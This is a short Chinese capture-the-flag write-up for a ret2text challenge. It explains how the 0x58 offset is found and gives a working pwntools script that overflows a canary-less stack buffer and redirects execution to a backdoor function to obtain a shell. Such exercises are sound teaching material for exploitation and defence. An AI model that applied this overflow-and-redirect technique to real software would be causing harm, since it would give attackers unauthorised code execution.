# week1ret2text

## 题目简述

程序包含地址固定的后门函数 `0x40115b`，同时存在无 Canary 保护的栈溢出。覆盖保存的返回地址，使函数返回到后门即可获得 Shell。

## 解题过程

反编译可见输入缓冲区位于 `rbp-0x50`。从缓冲区起点到保存的返回地址，需要先填满 `0x50` 字节局部变量，再覆盖 8 字节保存的 `rbp`，因此偏移为：

```text
0x50 + 0x8 = 0x58
```

后门地址由题目给出且程序未启用 PIE，可直接构造：

```python
from pwn import *

context.arch = "amd64"
io = process("./main")

offset = 0x58
backdoor = 0x40115b

io.recvline()
io.send(flat(b"A" * offset, backdoor))
io.interactive()
```

如果需要连接远端，只替换 `process("./main")` 为题目当前的 `remote(host, port)`，不要复用历史比赛 IP。

## 方法总结

ret2text 的核心是把返回地址改到主程序 `.text` 段内已有的有利函数。分析时要明确偏移由“局部缓冲区大小 + 保存的栈帧指针”组成，并确认目标函数地址不会被 PIE 随机化。
